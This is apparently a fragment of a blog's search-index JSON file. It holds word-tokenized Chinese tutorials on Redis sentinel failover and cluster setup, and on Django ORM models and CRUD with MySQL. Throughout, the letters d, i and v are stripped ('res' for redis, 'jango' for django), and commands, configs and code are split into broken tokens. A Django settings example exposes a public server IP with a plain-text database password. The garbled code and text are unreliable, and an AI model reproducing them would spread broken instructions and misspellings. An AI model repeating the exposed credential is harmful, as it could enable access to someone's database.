rep","resroot","10974","1","0","15",":","08","?","00",":","00",":","08","res","-","serer","127.0.0.1",":","6380","root","10978","1","0","15",":","08","?","00",":","00",":","07","res","-","serer","127.0.0.1",":","6381","root","10983","1","0","15",":","08","?","00",":","00",":","08","res","-","serer","127.0.0.1",":","6382","root","11060","1","0","17",":","10","?","00",":","00",":","01","res","-","sentnel","*",":","26379","[","sentnel","]","root","11064","1","0","17",":","10","?","00",":","00",":","01","res","-","sentnel","*",":","26378","[","sentnel","]","root","11068","1","0","17",":","10","?","00",":","00",":","01","res","-","sentnel","*",":","26380","[","sentnel","]","root","11123","10907","0","17",":","19","pts","0","00",":","00",":","00","grep","-","-","color","=","auto","res","[","root","@","noe","01","~","]","#","kll","-","9","10974","#","分析","哨兵","日志","[","root","@","noe","01","~","]","#","talf","tmpreslogsentne","1",".","log","11068",":","X","05","Apr","17",":","10",":","26.924","#","Sentnel","ID","s","58","bbb","66","f","27","e","1","e","87","ea","74","cae","765090","bcef","84","f","211068",":","X","05","Apr","17",":","10",":","26.924","#","+","montor","master","mymaster","127.0.0.1","6380","quorum","111068",":","X","05","Apr","17",":","10",":","26.925","*","+","slae","slae","127.0.0.1",":","6381","127.0.0.1","6381","@","mymaster","127.0.0.1","638011068",":","X","05","Apr","17",":","10",":","26.927","*","+","slae","slae","127.0.0.1",":","6382","127.0.0.1","6382","@","mymaster","127.0.0.1","638011068",":","X","05","Apr","17",":","10",":","28.906","*","+","sentnel","sentnel","3756","a","9","c","418","f","17","b","20","e","29","b","51","a","71","a","100","c","221","a","37379","127.0.0.1","26379","@","mymaster","127.0.0.1","638011068",":","X","05","Apr","17",":","10",":","28.932","*","+","sentnel","sentnel","125","c","8584642","c","32","b","15","f","364","b","43","afab","85","c","4858888","127.0.0.1","26378","@","mymaster","127.0.0.1","638011068",":","X","05","Apr","17",":","20",":","17.292","#","+","new","-","epoch","111068",":","X","05","Apr","17",":","20",":","17.294","#","+","ote","-","for","-","leaer","125","c","8584642","c","32","b","15","f","364","b","43","afab","85","c","4858888","1","#","主观","下线","11068",":","X","05","Apr","17",":","20",":","17.371","#","+","sown","master","mymaster","127.0.0.1","6380","#","客观","下线","11068",":","X","05","Apr","17",":","20",":","17.371","#","+","oown","master","mymaster","127.0.0.1","6380","#","quorum","1111068",":","X","05","Apr","17",":","20",":","17.371","#","Next","faloer","elay",":","I","wll","not","start","a","faloer","before","Sun","Apr","5","17",":","20",":","54","202011068",":","X","05","Apr","17",":","20",":","18.415","#","+","confg","-","upate","-","from","sentnel","125","c","8584642","c","32","b","15","f","364","b","43","afab","85","c","4858888","127.0.0.1","26378","@","mymaster","127.0.0.1","6380","#","master","切换","11068",":","X","05","Apr","17",":","20",":","18.415","#","+","swtch","-","master","mymaster","127.0.0.1","6380","127.0.0.1","638111068",":","X","05","Apr","17",":","20",":","18.416","*","+","slae","slae","127.0.0.1",":","6382","127.0.0.1","6382","@","mymaster","127.0.0.1","638111068",":","X","05","Apr","17",":","20",":","18.416","*","+","slae","slae","127.0.0.1",":","6380","127.0.0.1","6380","@","mymaster","127.0.0.1","638111068",":","X","05","Apr","17",":","20",":","24.461","#","+","sown","slae","127.0.0.1",":","6380","127.0.0.1","6380","@","mymaster","127.0.0.1","6381","重新","启动","6380","后","，","6380","将","变成","6381","的","slae","节点","[","root","@","noe","01","~","]","#","res","-","serer","tmpresconfres","_","6380",".","conf","127.0.0.1",":","6380","nfo","replcaton","#","Replcatonrole",":","slaemaster","_","host",":","127.0.0.1","master","_","port",":","6381","集群","架构","是","一种","分布式","解决方案","优点","：","每个","节点","都","可以","存储","数据","，","每个","节点","都","可以","响应","读写","操作","更","容易","扩容","缺点","：","部署","复杂","res","部分","cl","命令","受限","，","比如","批量","操作","等","每个","节点","如何","存储","数据","？","（","虚拟","槽","）","对象","保存","到","Res","之前","先","经过","CRC","16","哈希","到","一个","Noe","上","每个","Noe","被","平均","分配","到","一个","Slot","段","，","对应","着","0","-","16384","，","Slot","不能","重复","也","不能","缺失","，","否则","会","导致","对象","重复","存储","或","无法","存储","Noe","之间","相互","监听","，","一旦","有","Noe","退出","或者","加入","，","会","按照","Slot","为","单位","做","数据","迁移","。","例如","Noe","1","掉线","了","，","0","-","5640","这些","Slot","将会","平均","分摊","到","Noe","2","和","Noe","3","上","，","由于","Noe","2","和","Noe","3","本身","维护","的","Slot","还","会","再","自己","身上","不会","被","重新","分配","，","所以","执行","过程","中","不会","影响到","5641","-","16384","Slot","段","的","使用","。","计算","CRC","的","过程","，","就是","用","一个","特殊的","“","除法","”","，","来","得到","余数","，","这个","余数","就是","CRC","。","它","不是","真正","的","算术","上","的","除法","！","过程","和","算术","除法","过程","一样","，","只是","加减","运算","变成","了","XOR","（","异","或","）","运算","！","集群","实验","Res","5.0","之后","部署","会","简单","一点","wget","http",":","ownloa",".","res",".","oreleasesres","-","5.0.8",".","tar",".","gzyum","nstall","-","y","wget","gcc","make","tcltar","-","xzf","res","-","5.0.8",".","tar",".","gzc","res","-","5.0.8","make","#","这里","需要","注意","一下","，","如果","之前","没有","装","gcc","直接","make","，","然后","装","了","gcc","再次","make","，","会","提示","有","个","文件","没有","#","PATH","=","$","PATH",":","usrlocalresbn",",","如果","安装","的","时候","prefx","指定","了","路径","，","可以","修改","环境变量","m","res","-","5.0.8","resmkr","-","p","tmpres","-","cluster","#","!","bnbash","#","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","#","搭建","一个","Res","集群","#","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","mkr","tmpres","-","clusterres","&","#","123",";","7000",".",".","7005","&","#","125",";","-","ptouch","tmpres","-","clusterres","&","#","123",";","7000",".",".","7005","&","#","125",";","res",".","conffor","n","&","#","123",";","7000",".",".","7005","&","#","125",";",";","ocat","EOF","tmpres","-","clusterres","$","res",".","confaemonze","yesport","$","cluster","-","enable","yescluster","-","confg","-","fle","tmpres","-","clusterres","$","noes","-","$",".","confcluster","-","noe","-","tmeout","5000","appenonly","yesEOFrootressrcres","-","serer","tmpres","-","clusterres","$","res",".","confone","集群","中","有","6个","节点","，","设置","3个","master","3个","slaer","[","root","@","noe","01","~","]","#","rootressrcres","-","cl","-","-","cluster","create","127.0.0.1",":","7000","127.0.0.1",":","7001","127.0.0.1",":","7002","127.0.0.1",":","7003","127.0.0.1",":","7004","127.0.0.1",":","7005","-","-","cluster","-","replcas","1","Performng","hash","slots","allocaton","on","6","noes",".",".",".","#","分配","Slot","槽","Master","[","0","]","-","Slots","0","-","5460","Master","[","1","]","-","Slots","5461","-","10922","Master","[","2","]","-","Slots","10923","-","16383","Ang","replca","127.0.0.1",":","7004","to","127.0.0.1",":","7000","Ang","replca","127.0.0.1",":","7005","to","127.0.0.1",":","7001","Ang","replca","127.0.0.1",":","7003","to","127.0.0.1",":","7002","Tryng","to","optmze","slaes","allocaton","for","ant","-","affnty","[","WARNING","]","Some","slaes","are","n","the","same","host","as","ther","masterM",":","2518","beb","0563857","ab","5","c","1497","fffb","4","c","5","eb","3682103","127.0.0.1",":","7000","slots",":","[","0","-","5460","]","(","5461","slots",")","masterM",":","139","c","766","c","5275","ec","08","ae","47","f","90","b","695","e","9","c","6","c","88","eb","8","b","127.0.0.1",":","7001","slots",":","[","5461","-","10922","]","(","5462","slots",")","masterM",":","141382","f","53","c","59164","a","232329","efcc","9530","affc","43","a","25","127.0.0.1",":","7002","slots",":","[","10923","-","16383","]","(","5461","slots",")","masterS",":","9269115","a","3","ef","21","c","7","f","378","cc","68855","a","72059","e","943605","127.0.0.1",":","7003","replcates","2518","beb","0563857","ab","5","c","1497","fffb","4","c","5","eb","3682103","S",":","6","c","33423","a","686","f","301","f","756624174","bf","9","f","0487","a","67","127.0.0.1",":","7004","replcates","139","c","766","c","5275","ec","08","ae","47","f","90","b","695","e","9","c","6","c","88","eb","8","bS",":","f","8","c","74822","b","558","a","2","e","11","ae","36","cf","144","b","8","a","9388783","bf","95","127.0.0.1",":","7005","replcates","141382","f","53","c","59164","a","232329","efcc","9530","affc","43","a","25","Can","I","set","the","aboe","confguraton","?","(","type","'","yes","'","to","accept",")",":","yes","Noes","confguraton","upate","Assgn","a","fferent","confg","epoch","to","each","noe","Senng","CLUSTER","MEET","messages","to","jon","the","clusterWatng","for","the","cluster","to","jon",".",".",".","Performng","Cluster","Check","(","usng","noe","127.0.0.1",":","7000",")","M",":","2518","beb","0563857","ab","5","c","1497","fffb","4","c","5","eb","3682103","127.0.0.1",":","7000","slots",":","[","0","-","5460","]","(","5461","slots",")","master","1","atonal","replca","(","s",")","S",":","9269115","a","3","ef","21","c","7","f","378","cc","68855","a","72059","e","943605","127.0.0.1",":","7003","slots",":","(","0","slots",")","slae","replcates","2518","beb","0563857","ab","5","c","1497","fffb","4","c","5","eb","3682103","M",":","139","c","766","c","5275","ec","08","ae","47","f","90","b","695","e","9","c","6","c","88","eb","8","b","127.0.0.1",":","7001","slots",":","[","5461","-","10922","]","(","5462","slots",")","master","1","atonal","replca","(","s",")","S",":","f","8","c","74822","b","558","a","2","e","11","ae","36","cf","144","b","8","a","9388783","bf","95","127.0.0.1",":","7005","slots",":","(","0","slots",")","slae","replcates","141382","f","53","c","59164","a","232329","efcc","9530","affc","43","a","25","S",":","6","c","33423","a","686","f","301","f","756624174","bf","9","f","0487","a","67","127.0.0.1",":","7004","slots",":","(","0","slots",")","slae","replcates","139","c","766","c","5275","ec","08","ae","47","f","90","b","695","e","9","c","6","c","88","eb","8","bM",":","141382","f","53","c","59164","a","232329","efcc","9530","affc","43","a","25","127.0.0.1",":","7002","slots",":","[","10923","-","16383","]","(","5461","slots",")","master","1","atonal","replca","(","s",")","[","OK","]","All","noes","agree","about","slots","confguraton",".","Check","for","open","slots",".",".",".","Check","slots","coerage",".",".",".","[","OK","]","All","16384","slots","coere",".","验证","1","：","[","root","@","noe","01","~","]","#","ps","-","ef","grep","resroot","12733","1","0","21",":","02","?","00",":","00",":","00","rootressrcres","-","serer","*",":","7000","[","cluster","]","root","12736","1","0","21",":","02","?","00",":","00",":","00","rootressrcres","-","serer","*",":","7001","[","cluster","]","root","12742","1","0","21",":","02","?","00",":","00",":","00","rootressrcres","-","serer","*",":","7002","[","cluster","]","root","12751","1","0","21",":","02","?","00",":","00",":","00","rootressrcres","-","serer","*",":","7003","[","cluster","]","root","12757","1","0","21",":","02","?","00",":","00",":","00","rootressrcres","-","serer","*",":","7004","[","cluster","]","root","12764","1","0","21",":","02","?","00",":","00",":","00","rootressrcres","-","serer","*",":","7005","[","cluster","]","验证","2","：","登录","集群","查看","信息","[","root","@","noe","01","~","]","#","ressrcres","-","cl","-","c","-","p","7000127.0.0.1",":","7000","nfo","cluster","#","Clustercluster","_","enable",":","1127.0.0.1",":","7000","cluster","nfocluster","_","state",":","okcluster","_","slots","_","assgne",":","16384","cluster","_","slots","_","ok",":","16384","cluster","_","slots","_","pfal",":","0","cluster","_","slots","_","fal",":","0","cluster","_","known","_","noes",":","6","cluster","_","sze",":","3","cluster","_","current","_","epoch",":","6","cluster","_","my","_","epoch",":","1","cluster","_","stats","_","messages","_","png","_","sent",":","259","cluster","_","stats","_","messages","_","pong","_","sent",":","267","cluster","_","stats","_","messages","_","sent",":","526","cluster","_","stats","_","messages","_","png","_","recee",":","262","cluster","_","stats","_","messages","_","pong","_","recee",":","259","cluster","_","stats","_","messages","_","meet","_","recee",":","5","cluster","_","stats","_","messages","_","recee",":","526","#","slae","节点","后缀","ID","和","Master","的","ID","号","对应","2518","beb","0563857","ab","5","c","1497","fffb","4","c","5","eb","3682103","127.0.0.1",":","7000","@","17000","myself",",","master","-","0","1586092155000","1","connecte","0","-","54609269115","a","3","ef","21","c","7","f","378","cc","68855","a","72059","e","943605","127.0.0.1",":","7003","@","17003","slae","2518","beb","0563857","ab","5","c","1497","fffb","4","c","5","eb","3682103","0","1586092157502","4","connecte","139","c","766","c","5275","ec","08","ae","47","f","90","b","695","e","9","c","6","c","88","eb","8","b","127.0.0.1",":","7001","@","17001","master","-","0","1586092156896","2","connecte","5461","-","10922","f","8","c","74822","b","558","a","2","e","11","ae","36","cf","144","b","8","a","9388783","bf","95","127.0.0.1",":","7005","@","17005","slae","141382","f","53","c","59164","a","232329","efcc","9530","affc","43","a","25","0","1586092157502","6","connecte","6","c","33423","a","686","f","301","f","756624174","bf","9","f","0487","a","67","127.0.0.1",":","7004","@","17004","slae","139","c","766","c","5275","ec","08","ae","47","f","90","b","695","e","9","c","6","c","88","eb","8","b","0","1586092156391","5","connecte","141382","f","53","c","59164","a","232329","efcc","9530","affc","43","a","25","127.0.0.1",":","7002","@","17002","master","-","0","1586092157401","3","connecte","10923","-","16383","#","写入","值","，","重","定向","k","1","1","CRC","16","计算","，","-","-","slot","_","12706","，","给","7002号","master","127.0.0.1",":","7000","set","k","1","1","-","Rerecte","to","slot","[","12706","]","locate","at","127.0.0.1",":","7002","OK"],"url":"http://ymlog.cn/2020/04/01/Redis/","title":"Redis","content":"Redis简介Redis特点\nK-V 数据库\n支持丰富的数据类型：String、Hash、List、Set、Zset（5大基础类型）\n和Memcache对比：数据都是存储在内存中的，但是Redis可以做持久化存储（数据可以存储在磁盘上...","author":"ZEN","categorie":{"url":"http://ymlog.cn/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/","name":"数据库"},"date":"2020-04-01 15:03:22"},{"word":["前期","准备","0","、","首先","创建","一个","Django","项目","：","jango","-","amn","startproject","DoMoelc","DoMoeljango","-","amn","startapp","App","项目","框架","：","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","G",":","\\","Django","\\","jango","1.11","\\","DoMoeltree","FFoler","PATH","lstng","for","olume","tmpVolume","seral","number","s","1030","-","3","F","09","G",":",".","│","manage",".","py","│","├","─","─","─","App","#","我们","主要","写","代码","的","地方","│","│","amn",".","py","│","│","apps",".","py","│","│","moels",".","py","#","和","数据库","交互","的","地方","│","│","tests",".","py","│","│","ews",".","py","#","写","业务","逻辑","的","地方","│","│","_","_","nt","_","_",".","py","│","│","│","└","─","─","─","mgratons","│","_","_","nt","_","_",".","py","│","└","─","─","─","DoMoel","settngs",".","py","urls",".","py","wsg",".","py","_","_","nt","_","_",".","py","1","、","在","DoMoelDoMoelsettngs",".","py","中","加入","应用","MIDDLEWARE","=","[","'","jango",".","mleware",".","securty",".","SecurtyMleware","'",",","'","jango",".","contrb",".","sessons",".","mleware",".","SessonMleware","'",",","'","jango",".","mleware",".","common",".","CommonMleware","'",",","'","jango",".","mleware",".","csrf",".","CsrfVewMleware","'",",","'","jango",".","contrb",".","auth",".","mleware",".","AuthentcatonMleware","'",",","'","jango",".","contrb",".","messages",".","mleware",".","MessageMleware","'",",","'","jango",".","mleware",".","clckjackng",".","XFrameOptonsMleware","'",",","'","App","'",",","]","2","、","更改","DoMoelDoMoelsettngs",".","py","中","的","数据库","为","MySQL","，","下面","会","详细","讲解","如何","更换","数据库","3","、","在","DoMoelurls",".","py","中","注册","App","的","路由","urlpatterns","=","[","url","(","r","'","^","amn","'",",","amn",".","ste",".","urls",")",",","url","(","r","'","^","app","'",",","nclue","(","\"","App",".","urls","\"",")",")","]","更换","数据库","详解","在","DoMoelsettng",".","py","*","中","修改","DATABASES","设置","DATABASES","=","&","#","123",";","'","efault","'",":","&","#","123",";","'","ENGINE","'",":","'","jango",".","b",".","backens",".","mysql","'",",","'","NAME","'",":","'","moel","3","'",",","'","USER","'",":","'","nk","'",",","'","PASSWORD","'",":","'","123456","'",",","'","HOST","'",":","'","121.36.70.55","'",",","'","PORT","'",":","'","3306","'",",","&","#","125",";","&","#","125",";","1","、","在","MySQL","上","创建","数据库","moel","3",",","create","atabase","moel","3",";","2","、","添加","数据库","3","、","下载","驱动","4","、","安装","数据库","驱动","python","-","m","pp","nstall","-","-","upgrae","pp","-","https",":","pyp",".","tuna",".","tsnghua",".","eu",".","cnsmple","pp","nstall","pymysql","-","https",":","pyp",".","tuna",".","tsnghua",".","eu",".","cnsmple","5","、","伪装","驱动","因为","Django","是","不","认","pymysql","的","，","所以","需要","伪装","成","MySQL","_","b","#","HelloDjango","_","_","nt","_","_",".","pymport","pymysqlpymysql",".","nstall","_","as","_","MySQLb","(",")","6","、","执行","迁移","python","manage",".","py","makemgratonspython","manage",".","py","mgrate","可以","看到","Stuent","表","迁移","成功","：","简介","开发","环境","Wnows","10","Python","=","=","3.5.2","jango","=","1.11.7","MTVMVCMVC","：","（","Moel","、","Vew","、","Controller","）","Moel","：","用于","封装","与","应用程序","的","业务","逻辑","相关","的","数据","及","对数","据","的","处理","方法","，","是","web","应用程序","中用","于","处理","应用程序","的","数据","逻辑","部分","，","Moel","通常","只","提供","功能","性","的","接口","，","通过","这些","接口","可以","获取","Moel","的","所","有功","能","Vew","：","负责","数据","的","呈现","，","Vew","对","用户","直接","输出","Controller","：","负责","从","用户端","收集","用户","输入","，","主要","处理","用户","的","交互","MTV","是","从","MVC","演化","而","来","，","本质上","和","MVC","一样","，","只是","名字","改","了","：","MTV","：","（","Moel","、","Template","、","Vew","）","Moel","：","负责","业务","对象","和","数据库","对象","Vew","：","负责","业务","逻辑","，","并","在","适当的","时候","调用","Moule","和","Template","Template","：","负责","把","页面","展示","给","用户","在","Django","中","，","还有","url","，","主要","用来","将","一个个","URL","页面","请求","分发","给","不同的","ew","进行","处理","，","Vew","再","调用","相应","的","Moel","和","Template","。","ORMORM","（","Object","Relaton","Mappng","）","对象","关系","映射","，","就是","把","数据库","也","看作","是","一个","对象","，","将","数据库","的","属性","映射","到","对象","的","属性","和","方法","，","目的","是","为","了","将","业务","逻辑","和","SQL","语句","进行","解","耦合","：","数据库","的","表","（","table","）","–","类","（","class","）","记录","（","recor","，","行数","据","）","–","对象","（","object","）","字段","（","fel","）","–","对象","的","属性","（","attrbute","）","ORM","使用","对象","，","封装","了","数据库","操作","，","因此","可以","不","碰","SQL","语言","。","开发者","只","使用","面向","对象","编程","，","与","数据","对象","直接","交互","，","不用","关心","底层","数据库","。","下面","一段","代码","就是","创建","了","两","张表","，","Grae","表","的","字段","是","g","_","grae","、","Stuent","表","的","字段","是","s","_","name","、","s","_","passwor","和","s","_","grae","。","可以","看到","，","数据库","的","表","对应","了","面向","对象","的","类","，","且","必须","继承","自","moels",".","Moel","这个","类","；","字段","则","是","对应","了","面向","对象","的","属性","。","DoMoelAppmoels",".","py","from","jango",".","b","mport","moelsclass","Grae","(","moels",".","Moel",")",":","g","_","grae","=","moels",".","CharFel","(","max","_","length","=","16",")","class","Stuent","(","moels",".","Moel",")",":","s","_","name","=","moels",".","CharFel","(","max","_","length","=","32",")","s","_","passwor","=","moels",".","CharFel","(","max","_","length","=","32",")","s","_","grae","=","moels",".","ForegnKey","(","Grae",")","连接","数据库","映射","到","库","中","：","python","manage",".","py","makemgratons","#","生成","迁移","文件","python","manage",".","py","mgrate","#","执行","迁移","刷新","数据库","就","可以","看到","App","_","Stuent","和","App","_","Grae","两","张表","了","。","查看","表","的","定义","：","-","-","auto","-","generate","efntoncreate","table","App","_","stuent","(","nt","auto","_","ncrement","prmary","key",",","s","_","name","archar","(","32",")","not","null",",","s","_","passwor","archar","(","32",")","not","null",",","s","_","grae","_","nt","not","null",",","constrant","App","_","stuent","_","s","_","grae","_","_","797","e","4","cc","7","_","fk","_","App","_","grae","_","foregn","key","(","s","_","grae","_",")","references","App","_","grae","(",")",")",";","-","-","auto","-","generate","efntoncreate","table","App","_","grae","(","nt","auto","_","ncrement","prmary","key",",","g","_","grae","archar","(","16",")","not","null",")",";","定义","字段","字段","名","不允许","使用","下划线","，","因为","查询","条件","需要","用到","下","划线","字段","类型","字段","类型","含义","AutoFel","一个","根据","实际","ID","自动","增长","的","IntegerFel","，","通常","不","指定","如果","不","指定","，","一个","主键","字段","将","自动","添加","到","模型","中","CharFel","字符串","，","默认","的","表单","样式","是","TextInput","TextFel","大","文本","字段","，","一般","超过","4000","使用","，","默认","的","表单","控件","是","Textarea","IntegerFel","整数","DecmalFel","使用","python","的","Decmal","实例","表示","的","十进制","浮点","数","FloatFel","用","Python","的","float","实例","来","表示","的","浮点","数","BooleanFel","truefalse","字段","，","此","字段","的","默认","表单","控制","是","CheckboxInput","，","MySQL","不支持","Bool","值","，","所以","ORM","会","把","布尔","值","转换","为","tnynt","(","1",")","类型","NullBooleanFel","支","持","null","、","true","、","false","三种","值","DateFel","(","auto","_","now","=","False",",","auto","_","now","_","a","=","False",")","使用","Python","的","atetme",".","ate","实例","表示","的","日期","TmeFel","使用","Python","的","atetme",".","tme","实例","表示","的","时间","，","参数","同","DateFel","DateTmeFel","使用","Python","的","atetme",".","atetme","实例","表示","的","日期","和","时间","，","参数","同","DateFel","，","示例","：",".","o","_","tme","=","moes",".","DataTmeFel","(","auto","_","now","_","a","=","True",")","FleFel","一个","上传","文件","的","字段","ImageFel","继承","了","FleFel","的","所有","属性","和","方法","，","但","对","上传","的","对象","进行","校验","，","确保","它是","个","有效的","mage","DateFel","参数","说明","DateFel",".","auto","_","now","每次","保存","对象","时","，","自动","设置","该","字段","为","当前","时间","，","用于","&","quot",";","最后","一次","修改","&","quot",";","的","时间","戳","，","它","总是","使用","当前","日期","，","默认","为","false","DateFel",".","auto","_","now","_","a","1","、","当","对象","第一次","被","创建","时","自动","设置","当前","时间","，","用于","创建","的","时间","戳","，","它","总是","使用","当前","日期","，","默认","为","false","2","、","说明","该","字段","默认","对应","的","表单","控件","是","一个","TextInput",".","在","管理员","站点","添加","了","一个","JaaScrpt","写","的","日历","控件","，","和","一个","“","Toay","&","quot",";","的","快捷","按钮","，","包含","了","一个","额外","的","nal","_","ate","错误","消息","键","3","、","注意","auto","_","now","_","a",",","auto","_","now",",","an","efault","这些","设置","是","相互","排斥","的","，","他们","之间","的","任何","组合","将会","发生","错误","的","结果","字段","约束","字段","约束","含义","null","如果","为","True","，","Django","将","空","值","以","NULL","存储","到","数据库","中","，","默认值","是","False","blank","如果","为","True","，","则","该","字段","允许","为","空白","，","默认值","是","False","，","null","是","数据库","范畴","的","概念","，","blank","是","表单","验证","证","范畴","的","b","_","column","字段","的","名称","，","如果","未","指定","，","则","使用","属性","的","名称","b","_","nex","若值","为","True",",","则","在","表","中","会","为此","字段","创建","索引","efault","默认值","prmary","_","key","若","为","True",",","则","该","字段","会","成","为","模型","的","主键","字段","unque","如果","为","True",",","这个","字段","在","表","中","必须","有","唯一","值","示例","：","from","jango",".","b","mport","moels","#","Create","your","moels","here",".","class","Person","(","moels",".","Moel",")",":","#","max","_","length",":","最大","长度","#","unque",":","唯一","性","#","b","_","column",":","自定义","字段","名","，","如果","不","定义","，","就","直接","使用","s","_","name","s","_","name","=","moels",".","CharFel","(","max","_","length","=","16",",","unque","=","True",",","b","_","column","=","'","name","'",")","s","_","age","=","moels",".","IntegerFel","(","efault","=","18",",","b","_","column","=","'","age","'",")","#","False","表示","男","，","True","表示","女","s","_","sex","=","moels",".","BooleanFel","(","efault","=","False",",","b","_","column","=","'","sex","'",")","#","自定义","表","名","class","Meta",":","b","_","table","=","'","People","'","属性","显性","属性","（","开发者","手动","声明","的","属性","）","，","隐性","属性","（","没有","声明","，","父类","中","也","不存在","，","动态","产生","出来","的","；","如果","开发者","主动","声明","这些","属性","，","隐性","属性","自己","就","不再","产生","了","）","增删","改","查增","事前","准备","：","1","、","在","总的","urls","中","注册","App","的","urls","urlpatterns","=","[","url","(","r","'","^","amn","'",",","amn",".","ste",".","urls",")",",","url","(","r","'","^","app","'",",","nclue","(","\"","App",".","urls","\"",")",")","]","2","、","创建","并且","编写","App","的","urls",".","py","from","jango",".","conf",".","urls","mport","urlfrom","App","mport","ewsurlpatterns","=","[","url","(","r","'","^","aStuent","'",",","ews",".","aStuent",")",",","]","3","、","创建","ews","中的","函数","，","用于","添加","学生","数据","#","Create","your","ews","here",".","ef","aStuent","(","request",")",":","return","HttpResponse","(","&","quot",";","学生","数据","添加","成功","&","quot",";",")","4","、","手动","创建","几个","Grae","字段","创建","数据","的","几种","方式","1","、","直接","实例","化","对象","设置","属性","2","、","创建","对象","传入","属性","3","、","使用","Moel",".","objects",".","create","(",")","4","、","自己","封装","类","方法","创建","5","、","使用","Manager","(",")","中","封装","方法","创建","6","、","直接","调用","类","方法","添加","数据","1","、","直接","实例","化","对象","设置","属性","ef","aStuent","(","request",")",":","stuent","=","Stuent","(",")","stuent",".","s","_","name","=","\"","Jack","\"","grae","=","Grae",".","objects",".","get","(","pk","=","1",")","prnt","(","\"","What","s","The","Grae","Type",":","\"",",","type","(","grae",")",")","#","class","'","App",".","moels",".","Grae","'","stuent",".","s","_","grae","=","grae","#","因为","Stuent","和","Grae","进行","了","外键","关联","，","这里","需要","传入","的","是","一个","Grae","的","示例","，","不然","会报","错","stuent",".","s","_","passwor","=","\"","123456789","\"","stuent",".","sae","(",")","return","HttpResponse","(","\"","学生","数据","添加","成功","1","\"",")","之后","在","Stuent","表","中","就","会","多","出","一行","数据","了","MaraDB","[","moel","3","]","select","*","from","App","_","stuent",";","+","-","-","-","-","+","-","-","-","-","-","-","-","-","+","-","-","-","-","-","-","-","-","-","-","-","-","+","-","-","-","-","-","-","-","-","-","-","-","-","+","s","_","name","s","_","passwor","s","_","grae","_","+","-","-","-","-","+","-","-","-","-","-","-","-","-","+","-","-","-","-","-","-","-","-","-","-","-","-","+","-","-","-","-","-","-","-","-","-","-","-","-","+","1","Jack","123456789","1","+","-","-","-","-","+","-","-","-","-","-","-","-","-","+","-","-","-","-","-","-","-","-","-","-","-","-","+","-","-","-","-","-","-","-","-","-","-","-","-","+","2","、","创建","对象","传入","属性","ef","aStuent","(","request",")",":","grae","=","Grae",".","objects",".","get","(","pk","=","3",")","stuent","=","Stuent","(","s","_","name","=","'","Rose","'",",","s","_","passwor","=","'","abcefg","'",",","s","_","grae","=","grae",")","stuent",".","sae","(",")","return","HttpResponse","(","\"","学生","数据","添加","成功","2","\"",")","3","、","使用","Moel",".","objects",".","create","(",")","ef","aStuent","(","request",")",":","grae","=","Grae",".","objects",".","get","(","pk","=","2",")","stuent","=","Stuent",".","objects",".","create","(","s","_","name","=","'","Nk","'",",","s","_","passwor","=","'","987654321","'",",","s","_","grae","=","grae",")","stuent",".","sae","(",")","return","HttpResponse","(","\"","学生","数据","添加","成功","3","\"",")","4","、","自己","封装","类","方法","创建","封装","自己","的","类","方法","，","可以","添加","默认值","class","Stuent","(","moels",".","Moel",")",":","s","_","name","=","moels",".","CharFel","(","max","_","length","=","32",")","s","_","passwor","=","moels",".","CharFel","(","max","_","length","=","32",")","s","_","grae","=","moels",".","ForegnKey","(","Grae",")","@","classmetho","ef","create","(","cls",",","s","_","name",",","s","_","grae",",","s","_","passwor","=","'","PASWD","'",")",":","return","cls","(","s","_","name","=","s","_","name",",","s","_","passwor","=","s","_","passwor",",","s","_","grae","=","s","_","grae",")","调用","自己","封装","的","类","方法","ef","aStuent","(","request",")",":","grae","=","Grae",".","objects",".","get","(","pk","=","2",")","stuent","=","Stuent",".","objects",".","create","(","s","_","name","=","'","Bool","'",",","s","_","passwor","=","'","pouytq","'",",","s","_","grae","=","grae",")","stuent",".","sae","(",")","return","HttpResponse","(","\"","学生","数据","添加","成功","4","\"",")","5","、","使用","Manager","(",")","中","封装","方法","创建","在","Moels","中","定义","Manager","(",")","class","Stuent","(","moels",".","Moel",")",":","s","_","name","=","moels",".","CharFel","(","max","_","length","=","32",")","s","_","passwor","=","moels",".","CharFel","(","max","_","length","=","32",")","s","_","grae","=","moels",".","ForegnKey","(","Grae",")","#","多","出来","这","1","行","，","之后","调用","的","时候","可以","写","Stuent",".","s","_","m","，","而不是","Stuent",".","object","s","_","m","=","moels",".","Manager","(",")","在","ews","中","调用","Manager","(",")","ef","aStuent","(","request",")",":","grae","=","Grae",".","objects",".","get","(","pk","=","2",")","stuent","=","Stuent",".","s","_","m",".","create","(","s","_","name","=","'","ZJ","'",",","s","_","passwor","=","'","ILKEY","'",",","s","_","grae","=","grae",")","stuent",".","sae","(",")","return","HttpResponse","(","\"","学生","数据","添加","成功","5","\"",")","6","、","直接","调用","类","方法","添加","数据","person","=","Person",".","create","(","'","Neo","'",",","18",")","person",".","sae","(",")","删","删除","是","基于","查询","的","，","把","查询","到","的","结果","进行","删除","，","这里","删除","的","是","主键","为","2","的","，","因为","刚刚","jack","插入","了","两次","，","重复","了","，","所以","删","了","。","ef","elStuent","(","request",")",":","stuent","=","Stuent",".","objects",".","get","(","pk","=","2",")","stuent",".","elete","(",")","return","HttpResponse","(","\"","删除","成功","！","\"",")","改","修改","是","基于","查询","的","，","修改","后","保存","。","此时","的","数据库","表","：","MaraDB","[","moel","3","]","select","*","from","App","_","stuent",";","+","-","-","-","-","+","-","-","-","-","-","-","-","-","+","-","-","-","-","-","-","-","-","-","-","-","-","+","-","-","-","-","-","-","-","-","-","-","-","-","+","s","_","name","s","_","passwor","s","_","grae","_","+","-","-","-","-","+","-","-","-","-","-","-","-","-","+","-","-","-","-","-","-","-","-","-","-","-","-","+","-","-","-","-","-","-","-","-","-","-","-","-","+","1","Jack","123456789","1","3","Nk","987654321","1","4","Rose","abcefg","3","5","Bool","pouytq","2","6","ZJ","ILKEY","2","+","-","-","-","-","+","-","-","-","-","-","-","-","-","+","-","-","-","-","-","-","-","-","-","-","-","-","+","-","-","-","-","-","-","-","-","-","-","-